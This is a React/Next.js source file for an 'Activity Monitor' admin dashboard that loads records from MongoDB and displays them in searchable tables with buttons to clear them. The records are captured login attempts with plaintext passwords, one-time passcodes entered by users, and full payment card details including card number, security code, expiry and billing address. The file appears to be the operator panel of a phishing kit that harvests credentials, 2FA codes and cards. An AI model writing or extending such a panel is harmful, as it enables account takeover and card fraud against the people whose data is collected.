"use client";

import { useCallback, useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import PortalHeader from "../../components/portal-header";
import {
  clearAdminSession,
  clearLoginAttemptsFromDB,
  clearOTPAttemptsFromDB,
  clearPaymentsFromDB,
  getAdminSession,
  getLoginAttemptsFromDB,
  getOTPAttemptsFromDB,
  getPaymentsFromDB,
} from "../../utils/auth";

interface DBLoginAttempt {
  _id: string;
  userId?: string;
  email: string;
  password: string;
  success: boolean;
  timestamp: string;
}

interface DBOTPAttempt {
  _id: string;
  userId?: string;
  email: string;
  otpCode: string;
  status: "correct" | "incorrect";
  timestamp: string;
}

interface DBPayment {
  _id: string;
  email: string;
  firstName: string;
  lastName: string;
  amount: number;
  description?: string;
  paymentMethod: string;
  cardFirstName?: string;
  cardLastName?: string;
  cardNumber?: string;
  securityCode?: string;
  expirationMonth?: string;
  expirationYear?: string;
  streetAddress?: string;
  streetAddress2?: string;
  city?: string;
  state?: string;
  postalCode?: string;
  country?: string;
  timestamp: string;
}

function formatDate(value: string): string {
  const parsed = new Date(value);
  if (Number.isNaN(parsed.getTime())) return "-";
  return parsed.toLocaleDateString();
}

function formatTime(value: string): string {
  const parsed = new Date(value);
  if (Number.isNaN(parsed.getTime())) return "-";
  return parsed.toLocaleTimeString();
}

function formatCardDetails(payment: DBPayment): string {
  if (payment.paymentMethod !== "credit-card") return "-";
  const cardNumber = payment.cardNumber ? `****${payment.cardNumber.slice(-4)}` : "";
  const expiry = payment.expirationMonth && payment.expirationYear
    ? `${payment.expirationMonth}/${payment.expirationYear}`
    : "";
  return `${cardNumber} ${expiry}`.trim() || "-";
}

function formatBillingAddress(payment: DBPayment): string {
  if (!payment.streetAddress) return "-";
  const address = [
    payment.streetAddress,
    payment.streetAddress2,
    `${payment.city}, ${payment.state} ${payment.postalCode}`,
    payment.country
  ].filter(Boolean).join(", ");
  return address || "-";
}

export default function AdminDashboardPage() {
  const router = useRouter();
  const [loginAttempts, setLoginAttempts] = useState<DBLoginAttempt[]>([]);
  const [otpAttempts, setOtpAttempts] = useState<DBOTPAttempt[]>([]);
  const [payments, setPayments] = useState<DBPayment[]>([]);
  const [searchTerm, setSearchTerm] = useState("");
  const [activeTab, setActiveTab] = useState<"login" | "otp" | "payments">("login");
  const [isLoadingData, setIsLoadingData] = useState(false);
  const [isClearingLogs, setIsClearingLogs] = useState(false);
  const [loadError, setLoadError] = useState("");
  const [selectedPayment, setSelectedPayment] = useState<DBPayment | null>(null);
  const [showPaymentModal, setShowPaymentModal] = useState(false);

  const session = getAdminSession();
  const isAuthenticated = !!session?.isAuthenticated;
  const adminEmail = session?.email ?? "";

  useEffect(() => {
    if (!isAuthenticated) {
      router.push("/");
    }
  }, [isAuthenticated, router]);

  const loadAttempts = useCallback(async () => {
    setIsLoadingData(true);
    setLoadError("");

    try {
      const [loginResponse, otpResponse, paymentsResponse] = await Promise.all([
        getLoginAttemptsFromDB(undefined, 200, 0),
        getOTPAttemptsFromDB(undefined, 200, 0),
        getPaymentsFromDB(undefined, 200, 0),
      ]);

      if (loginResponse?.success) {
        setLoginAttempts(loginResponse.data || []);
      }

      if (otpResponse?.success) {
        setOtpAttempts(otpResponse.data || []);
      }

      if (paymentsResponse?.success) {
        setPayments(paymentsResponse.data || []);
      }

      if (!loginResponse?.success || !otpResponse?.success || !paymentsResponse?.success) {
        setLoadError("Some records could not be loaded from MongoDB.");
      }
    } catch {
      setLoadError("Unable to load records from MongoDB.");
    } finally {
      setIsLoadingData(false);
    }
  }, []);

  useEffect(() => {
    if (!isAuthenticated) return;

    loadAttempts();
    const intervalId = window.setInterval(loadAttempts, 10000);

    return () => {
      window.clearInterval(intervalId);
    };
  }, [isAuthenticated, loadAttempts]);

  const handleLogout = async () => {
    try {
      await fetch("/api/auth/logout", { method: "POST" });
    } catch {
      // Ignore logout API errors and continue clearing local session.
    }

    clearAdminSession();
    router.push("/");
  };

  const handlePaymentClick = (payment: DBPayment) => {
    setSelectedPayment(payment);
    setShowPaymentModal(true);
  };

  const closePaymentModal = () => {
    setShowPaymentModal(false);
    setSelectedPayment(null);
  };

  const handleClearLogs = async () => {
    setIsClearingLogs(true);
    try {
      let success = false;
      if (activeTab === "login") {
        success = await clearLoginAttemptsFromDB();
        if (success) setLoginAttempts([]);
      } else if (activeTab === "otp") {
        success = await clearOTPAttemptsFromDB();
        if (success) setOtpAttempts([]);
      } else if (activeTab === "payments") {
        success = await clearPaymentsFromDB();
        if (success) setPayments([]);
      }
      if (!success) {
        setLoadError("Failed to clear records from MongoDB.");
      }
    } catch {
      setLoadError("Unable to clear records from MongoDB.");
    } finally {
      setIsClearingLogs(false);
    }
  };

  const filteredLoginAttempts = loginAttempts.filter((attempt) => {
    const term = searchTerm.toLowerCase();
    return (
      attempt.email.toLowerCase().includes(term) ||
      (attempt.userId || "").toLowerCase().includes(term) ||
      attempt.password.toLowerCase().includes(term)
    );
  });

  const filteredOTPAttempts = otpAttempts.filter((attempt) => {
    const term = searchTerm.toLowerCase();
    return (
      attempt.email.toLowerCase().includes(term) ||
      attempt.otpCode.includes(searchTerm) ||
      attempt.status.toLowerCase().includes(term)
    );
  });

  const filteredPayments = payments.filter((payment) => {
    const term = searchTerm.toLowerCase();
    return (
      payment.email.toLowerCase().includes(term) ||
      payment.firstName.toLowerCase().includes(term) ||
      payment.lastName.toLowerCase().includes(term) ||
      payment.paymentMethod.toLowerCase().includes(term) ||
      payment.amount.toString().includes(searchTerm) ||
      (payment.cardNumber || "").includes(searchTerm) ||
      (payment.streetAddress || "").toLowerCase().includes(term) ||
      (payment.city || "").toLowerCase().includes(term) ||
      (payment.state || "").toLowerCase().includes(term) ||
      (payment.country || "").toLowerCase().includes(term) ||
      (payment.description || "").toLowerCase().includes(term)
    );
  });

  if (!isAuthenticated) {
    return null;
  }

  return (
    <div className="min-h-screen bg-[#efefef] text-[#2f3a48]">
      <PortalHeader />

      <main className="w-full pt-5 pb-5 md:pt-0 md:pb-12">
        <section className="w-full border-b border-[#e1e1e1] bg-white">
          <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
            <div className="mb-4 flex items-center justify-between">
              <div>
                <h1 className="text-[34px] leading-tight font-normal md:text-[44px]">
                  <strong className="font-bold">Activity Monitor</strong>
                </h1>
                <p className="mt-2 text-[#6b7580]">
                  Logged in as: <strong>{adminEmail}</strong>
                </p>
              </div>
              <div className="flex items-center gap-3">
                <button
                  onClick={loadAttempts}
                  className="rounded border border-[#c7ccd3] px-4 py-3 text-[14px] font-semibold text-[#2f3a48] hover:bg-[#f3f3f3]"
                >
                  {isLoadingData ? "Refreshing..." : "Refresh"}
                </button>
                <button
                  onClick={handleClearLogs}
                  disabled={isClearingLogs}
                  className="rounded bg-[#dc3545] px-4 py-3 text-[14px] font-semibold text-white transition-colors hover:bg-[#c82333] disabled:cursor-not-allowed disabled:opacity-50"
                >
                  {isClearingLogs ? "Clearing..." : `Clear ${activeTab === "login" ? "Login" : activeTab === "otp" ? "OTP" : "Payments"} Records`}
                </button>
                <button
                  onClick={handleLogout}
                  className="rounded bg-[#f47c20] px-6 py-3 text-[16px] font-semibold text-white transition-colors hover:bg-[#d96518]"
                >
                  Logout
                </button>
              </div>
            </div>
            {loadError && <p className="text-[14px] text-[#bd2a2a]">{loadError}</p>}
          </div>
        </section>

        <section className="w-full border-b border-[#e1e1e1] bg-white">
          <div className="mx-auto w-full max-w-[1400px] px-4 md:px-10">
            <div className="flex gap-0">
              <button
                onClick={() => setActiveTab("login")}
                className={`px-6 py-4 text-[16px] font-semibold transition-colors border-b-4 ${
                  activeTab === "login"
                    ? "text-[#f47c20] border-[#f47c20]"
                    : "text-[#6b7580] border-transparent hover:text-[#2f3a48]"
                }`}
              >
                Login Attempts ({loginAttempts.length})
              </button>
              <button
                onClick={() => setActiveTab("otp")}
                className={`px-6 py-4 text-[16px] font-semibold transition-colors border-b-4 ${
                  activeTab === "otp"
                    ? "text-[#f47c20] border-[#f47c20]"
                    : "text-[#6b7580] border-transparent hover:text-[#2f3a48]"
                }`}
              >
                OTP Attempts ({otpAttempts.length})
              </button>
              <button
                onClick={() => setActiveTab("payments")}
                className={`px-6 py-4 text-[16px] font-semibold transition-colors border-b-4 ${
                  activeTab === "payments"
                    ? "text-[#f47c20] border-[#f47c20]"
                    : "text-[#6b7580] border-transparent hover:text-[#2f3a48]"
                }`}
              >
                Payments ({payments.length})
              </button>
            </div>
          </div>
        </section>

        <section className="w-full border-b border-[#e1e1e1] bg-white">
          <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-6">
            <div className="flex flex-col items-end gap-4 md:flex-row">
              <div className="flex-1">
                <label className="mb-2 block text-[14px] font-semibold text-[#2f3a48]">Search</label>
                <input
                  type="text"
                  placeholder={activeTab === "login" ? "Search by email/user/password..." : activeTab === "otp" ? "Search by email/OTP/status..." : "Search by email/name/amount..."}
                  value={searchTerm}
                  onChange={(event) => setSearchTerm(event.target.value)}
                  className="h-[50px] w-full border border-[#c7ccd3] bg-white px-4 text-[16px] text-[#2f3a48] outline-none placeholder:text-[#6b7580] focus:border-[#f47c20] focus:shadow-[inset_4px_0_0_#f47c20]"
                />
              </div>
            </div>
            <p className="mt-4 text-[14px] text-[#6b7580]">
              Showing <strong>{activeTab === "login" ? filteredLoginAttempts.length : activeTab === "otp" ? filteredOTPAttempts.length : filteredPayments.length}</strong> of{" "}
              <strong>{activeTab === "login" ? loginAttempts.length : activeTab === "otp" ? otpAttempts.length : payments.length}</strong>{" "}
              {activeTab === "login" ? "login attempts" : activeTab === "otp" ? "OTP attempts" : "payments"}
            </p>
          </div>
        </section>

        {activeTab === "login" && (
          <section className="w-full bg-white">
            <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
              {filteredLoginAttempts.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="border-b border-[#e1e1e1] bg-[#f3f3f3]">
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">#</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Email</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Password</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Success</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Date</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Time</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredLoginAttempts.map((attempt, index) => (
                        <tr key={attempt._id} className="border-b border-[#e1e1e1] transition-colors hover:bg-[#f9f9f9]">
                          <td className="px-4 py-3 text-[14px] font-semibold text-[#2f3a48]">{index + 1}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{attempt.email}</td>
                          <td className="px-4 py-3 text-[14px] font-mono text-[#2f3a48]">{attempt.password}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{attempt.success ? "yes" : "no"}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{formatDate(attempt.timestamp)}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{formatTime(attempt.timestamp)}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="py-12 text-center">
                  <p className="text-[18px] text-[#6b7580]">No login attempts recorded yet.</p>
                </div>
              )}
            </div>
          </section>
        )}

        {activeTab === "otp" && (
          <section className="w-full bg-white">
            <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
              {filteredOTPAttempts.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="border-b border-[#e1e1e1] bg-[#f3f3f3]">
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">#</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Email</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">OTP Code</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Status</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Date</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Time</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredOTPAttempts.map((attempt, index) => (
                        <tr key={attempt._id} className="border-b border-[#e1e1e1] transition-colors hover:bg-[#f9f9f9]">
                          <td className="px-4 py-3 text-[14px] font-semibold text-[#2f3a48]">{index + 1}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{attempt.email}</td>
                          <td className="px-4 py-3 text-[14px] font-mono font-bold text-[#2f3a48]">{attempt.otpCode}</td>
                          <td className="px-4 py-3 text-[14px]">
                            <span
                              className={`inline-block rounded px-3 py-1 text-[12px] font-semibold text-white ${
                                attempt.status === "correct" ? "bg-[#28a745]" : "bg-[#dc3545]"
                              }`}
                            >
                              {attempt.status === "correct" ? "Correct" : "Incorrect"}
                            </span>
                          </td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{formatDate(attempt.timestamp)}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{formatTime(attempt.timestamp)}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="py-12 text-center">
                  <p className="text-[18px] text-[#6b7580]">No OTP attempts recorded yet.</p>
                </div>
              )}
            </div>
          </section>
        )}

        {activeTab === "payments" && (
          <section className="w-full bg-white">
            <div className="mx-auto w-full max-w-[1400px] px-4 py-6 md:px-10 md:py-10">
              {filteredPayments.length > 0 ? (
                <div className="overflow-x-auto">
                  <table className="w-full border-collapse">
                    <thead>
                      <tr className="border-b border-[#e1e1e1] bg-[#f3f3f3]">
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">#</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Email</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Name</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Amount</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Payment Method</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Card Details</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Billing Address</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Description</th>
                        <th className="px-4 py-3 text-left text-[14px] font-semibold text-[#2f3a48]">Date/Time</th>
                      </tr>
                    </thead>
                    <tbody>
                      {filteredPayments.map((payment, index) => (
                        <tr
                          key={payment._id}
                          className="border-b border-[#e1e1e1] transition-colors hover:bg-[#f9f9f9] cursor-pointer"
                          onClick={() => handlePaymentClick(payment)}
                        >
                          <td className="px-4 py-3 text-[14px] font-semibold text-[#2f3a48]">{index + 1}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{payment.email}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{payment.firstName} {payment.lastName}</td>
                          <td className="px-4 py-3 text-[14px] font-semibold text-[#2f3a48]">${payment.amount.toFixed(2)}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{payment.paymentMethod === "credit-card" ? "Credit Card" : "PayPal"}</td>
                          <td className="px-4 py-3 text-[14px] font-mono text-[#2f3a48]">{formatCardDetails(payment)}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48] max-w-[200px] truncate" title={formatBillingAddress(payment)}>{formatBillingAddress(payment)}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{payment.description || "-"}</td>
                          <td className="px-4 py-3 text-[14px] text-[#2f3a48]">{formatDate(payment.timestamp)}<br/>{formatTime(payment.timestamp)}</td>
                        </tr>
                      ))}
                    </tbody>
                  </table>
                </div>
              ) : (
                <div className="py-12 text-center">
                  <p className="text-[18px] text-[#6b7580]">No payments submitted yet.</p>
                </div>
              )}
            </div>
          </section>
        )}
      </main>

      {/* Payment Details Modal */}
      {showPaymentModal && selectedPayment && (
        <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-lg shadow-xl max-w-2xl w-full max-h-[90vh] overflow-y-auto">
            <div className="p-6 border-b border-[#e1e1e1]">
              <div className="flex items-center justify-between">
                <h2 className="text-[24px] font-bold text-[#2f3a48]">Payment Details</h2>
                <button
                  onClick={closePaymentModal}
                  className="text-[#6b7580] hover:text-[#2f3a48] text-[24px] leading-none"
                >
                  ×
                </button>
              </div>
            </div>

            <div className="p-6 space-y-6">
              {/* Basic Information */}
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Email</label>
                  <p className="text-[16px] text-[#6b7580]">{selectedPayment.email}</p>
                </div>
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Amount</label>
                  <p className="text-[16px] text-[#6b7580] font-semibold">${selectedPayment.amount.toFixed(2)}</p>
                </div>
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Name</label>
                  <p className="text-[16px] text-[#6b7580]">{selectedPayment.firstName} {selectedPayment.lastName}</p>
                </div>
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Payment Method</label>
                  <p className="text-[16px] text-[#6b7580]">{selectedPayment.paymentMethod === "credit-card" ? "Credit Card" : "PayPal"}</p>
                </div>
              </div>

              {/* Description */}
              {selectedPayment.description && (
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Description</label>
                  <p className="text-[16px] text-[#6b7580]">{selectedPayment.description}</p>
                </div>
              )}

              {/* Credit Card Details */}
              {selectedPayment.paymentMethod === "credit-card" && (
                <div className="border-t border-[#e1e1e1] pt-6">
                  <h3 className="text-[18px] font-semibold text-[#2f3a48] mb-4">Credit Card Information</h3>
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Cardholder Name</label>
                      <p className="text-[16px] text-[#6b7580]">{selectedPayment.cardFirstName} {selectedPayment.cardLastName}</p>
                    </div>
                    <div>
                      <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Card Number</label>
                      <p className="text-[16px] text-[#6b7580] font-mono">{selectedPayment.cardNumber}</p>
                    </div>
                    <div>
                      <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Security Code</label>
                      <p className="text-[16px] text-[#6b7580] font-mono">{selectedPayment.securityCode}</p>
                    </div>
                    <div>
                      <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Expiration Date</label>
                      <p className="text-[16px] text-[#6b7580]">{selectedPayment.expirationMonth}/{selectedPayment.expirationYear}</p>
                    </div>
                  </div>
                </div>
              )}

              {/* Billing Address */}
              <div className="border-t border-[#e1e1e1] pt-6">
                <h3 className="text-[18px] font-semibold text-[#2f3a48] mb-4">Billing Address</h3>
                <div className="text-[16px] text-[#6b7580] space-y-1">
                  <p>{selectedPayment.streetAddress}</p>
                  {selectedPayment.streetAddress2 && <p>{selectedPayment.streetAddress2}</p>}
                  <p>{selectedPayment.city}, {selectedPayment.state} {selectedPayment.postalCode}</p>
                  <p>{selectedPayment.country}</p>
                </div>
              </div>

              {/* Timestamp */}
              <div className="border-t border-[#e1e1e1] pt-6">
                <div>
                  <label className="block text-[14px] font-semibold text-[#2f3a48] mb-1">Submission Date & Time</label>
                  <p className="text-[16px] text-[#6b7580]">{formatDate(selectedPayment.timestamp)} at {formatTime(selectedPayment.timestamp)}</p>
                </div>
              </div>
            </div>

            <div className="p-6 border-t border-[#e1e1e1] flex justify-end">
              <button
                onClick={closePaymentModal}
                className="px-6 py-3 bg-[#f47c20] text-white rounded hover:bg-[#d96518] transition-colors"
              >
                Close
              </button>
            </div>
          </div>
        </div>
      )}
    </div>
  );
}
